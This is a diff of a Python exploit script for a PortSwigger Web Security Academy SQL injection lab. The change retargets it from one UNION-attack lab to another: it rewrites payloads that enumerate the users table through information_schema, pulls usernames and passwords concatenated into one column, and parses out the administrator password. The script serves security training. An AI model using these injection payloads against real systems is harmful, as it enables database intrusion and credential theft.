@@ -1,5 +1,5 @@
-# Lab name: Lab: SQL injection UNION attack, retrieving data from other tables
-# Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+# Lab name: Lab: SQL injection UNION attack, retrieving multiple values in a single column
+# Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
 
 import requests
 import os, sys
@@ -10,8 +10,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 r = requests.Session()
 admin_username = 'administrator'
 password = ''
-poc_payload_for_users_table = "filter?category='union+SELECT+null,TABLE_NAME+FROM+information_schema.tables+where+TABLE_NAME+LIKE+'%25users%25'--"
-payload_to_get_users_with_passwords = "='union+SELECT+username,password+FROM+users--"
+poc_payload_for_users_table = "filter?category='union+SELECT+null,TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_NAME+like+'%25users%25'--"
+payload_to_get_users_with_passwords = "='union+SELECT+null,CONCAT(username,'%23',password)+FROM+users--"
 
 url = input('Enter lab url: ')
 proxies = {
@@ -27,8 +27,8 @@ def filter_url():
 
 
 def get_administrator_password(response):
-    password = ((response.text.split(f'<th>{admin_username}</th>')[1])
-           .split('</tr>',1)[0]).replace('<td>','').replace('</td>','').strip()
+    password = ((response.text.split(admin_username)[1])
+           .split('</th>',1)[0]).replace('#','').strip()
     return password
 
 def get_csrf_token_from_response(url):
